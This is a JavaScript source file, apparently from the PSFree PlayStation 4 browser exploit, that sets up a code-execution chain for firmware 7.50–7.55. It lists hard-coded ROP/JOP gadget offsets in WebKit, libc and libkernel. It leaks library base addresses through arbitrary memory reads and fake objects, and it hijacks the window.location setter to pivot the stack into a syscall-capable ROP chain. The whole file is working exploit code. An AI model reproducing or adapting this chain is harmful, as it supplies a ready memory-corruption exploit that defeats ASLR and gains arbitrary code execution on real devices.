/* Copyright (C) 2024-2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// 7.50, 7.51, 7.55

import { log } from '../module/utils.js';
import { mem } from '../module/mem.js';
import { KB } from '../module/constants.js';
import { ChainBase } from '../module/chain.js';
import { js_cell, js_butterfly, js_inline_prop, jsta_impl } from '../module/offset.js';
import { BufferView } from '../module/view.js';

import {
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from '../module/memtools.js';

import * as rw from '../module/rw.js';

const syscall_array = [];

// WebKit offsets of imported functions
const offset_wk_stack_chk_fail = 0x2438;
const offset_wk_strlen = 0x2478;

// libSceNKWebKit.sprx
export let libwebkit_base = null;
// libkernel_web.sprx
export let libkernel_base = null;
// libSceLibcInternal.sprx
export let libc_base = null;

// gadgets for the JOP chain
const jop1 = `
mov rdi, qword ptr [rsi + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x70]
`;
const jop2 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop3 = `
mov rdx, qword ptr [rdx + 0x50]
mov ecx, 0xa
call qword ptr [rax + 0x40]
`;
const jop4 = `
push rdx
jmp qword ptr [rax]
`;
const jop5 = 'pop rsp; ret';

const webkit_gadget_offsets = new Map(Object.entries({
    'pop rax; ret' : 0x000000000003650b,
    'pop rbx; ret' : 0x0000000000015d5c,
    'pop rcx; ret' : 0x000000000002691b,
    'pop rdx; ret' : 0x0000000000061d52,

    'pop rbp; ret' : 0x00000000000000b6,
    'pop rsi; ret' : 0x000000000003c827,
    'pop rdi; ret' : 0x000000000024d2b0,
    'pop rsp; ret' : 0x000000000005f959,

    'pop r8; ret' : 0x00000000005f99e0,
    'pop r9; ret' : 0x000000000070439f,
    'pop r10; ret' : 0x0000000000061d51,
    'pop r11; ret' : 0x0000000000d492bf,

    'pop r12; ret' : 0x0000000000da945c,
    'pop r13; ret' : 0x00000000019ccebb,
    'pop r14; ret' : 0x000000000003c826,
    'pop r15; ret' : 0x000000000024d2af,

    'ret' : 0x0000000000000032,
    'leave; ret' : 0x000000000025654b,

    'mov rax, qword ptr [rax]; ret' : 0x000000000002e592,
    'mov qword ptr [rdi], rax; ret' : 0x000000000005becb,
    'mov dword ptr [rdi], eax; ret' : 0x00000000000201c4,
    'mov dword ptr [rax], esi; ret' : 0x00000000002951bc,

    [jop1] : 0x00000000019b4c80,
    [jop2] : 0x000000000077b420,
    [jop3] : 0x0000000000f87995,
    [jop4] : 0x0000000001f1c866,
    [jop5] : 0x000000000005f959,
}));

const libc_gadget_offsets = new Map(Object.entries({
    'getcontext' : 0x25f34,
    'setcontext' : 0x2a388,
}));

const libkernel_gadget_offsets = new Map(Object.entries({
    '__error' : 0x16220,
}));

export const gadgets = new Map();

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(jsta_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const off_ta_vt = 0x23ae2b0;
    const libwebkit_base = textarea_vtable.sub(off_ta_vt);

    const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
    const off_scf = 0x12ac0;
    const libkernel_base = stack_chk_fail_addr.sub(off_scf);

    const strlen_import = libwebkit_base.add(offset_wk_strlen);
    const strlen_addr = resolve_import(strlen_import);
    const off_strlen = 0x4f580;
    const libc_base = strlen_addr.sub(off_strlen);

    return [libwebkit_base, libkernel_base, libc_base];
}

export function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

function get_gadget(gadget_map, insn) {
    const addr = gadget_map.get(insn);
    if (addr === undefined) {
        throw Error(`gadget not found: ${insn}`);
    }
    return addr;
}

class Chain750Base extends ChainBase {
    constructor() {
        super();
        this.is_stale = false;
        this.position = 0;
    }

    push_end() {
        this.push_gadget('leave; ret');
    }

    push_get_retval() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.retval_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');
    }

    push_get_errno() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.errno_addr);
        this.push_call(this.get_gadget('__error'));
        this.push_gadget('mov rax, qword ptr [rax]; ret');
        this.push_gadget('mov dword ptr [rdi], eax; ret');
    }

    push_clear_errno() {
        this.push_call(this.get_gadget('__error'));
        this.push_gadget('pop rsi; ret');
        this.push_value(0);
        this.push_gadget('mov dword ptr [rax], esi; ret');
    }

    check_stale() {
        if (this.is_stale) {
            throw Error('chain already ran, clean it first');
        }
        this.is_stale = true;
    }

    check_is_empty() {
        if (this.position === 0) {
            throw Error('chain is empty');
        }
    }

    clean() {
        super.clean();
        this.is_stale = false;
        this.position = 0;
    }
}

export class Chain750 extends Chain750Base {
    constructor() {
        super();
        const [rdx, rdx_bak] = mem.gc_alloc(0x58);
        rdx.write64(js_cell, this._empty_cell);
        rdx.write64(0x50, this.stack_addr);
        this._rsp = mem.fakeobj(rdx);
    }

    run() {
        this.check_stale();
        this.check_is_empty();
        this._rop.launch = this._rsp;
        this.is_stale = true;
    }
}

export const Chain = Chain750;

export function init(Chain) {
    [libwebkit_base, libkernel_base, libc_base] = get_bases();

    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
    init_syscall_array(syscall_array, libkernel_base, 300 * KB);

    let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
    gs = mem.addrof(gs).readp(0x28);

    const size_cgs = 0x18;
    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
    mem.cpy(gc_buf, gs, size_cgs);
    gc_buf.write64(0x10, get_gadget(gadgets, jop1));

    const proto = Chain.prototype;
    const _rop = {
        get launch() { throw Error('never call'); },
        0: 1.1,
    };
    mem.addrof(_rop).write64(js_inline_prop, gc_buf);
    proto._rop = _rop;

    const rax_ptrs = new BufferView(0x100);
    const rax_ptrs_p = get_view_vector(rax_ptrs);
    proto._rax_ptrs = rax_ptrs;

    rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
    rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
    rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
    rax_ptrs.write64(0, get_gadget(gadgets, jop5));

    const jop_buffer_p = mem.addrof(_rop).readp(js_butterfly);
    jop_buffer_p.write64(0, rax_ptrs_p);

    const empty = {};
    proto._empty_cell = mem.addrof(empty).read64(js_cell);

    Chain.init_class(gadgets, syscall_array);
}

log('Chain750');
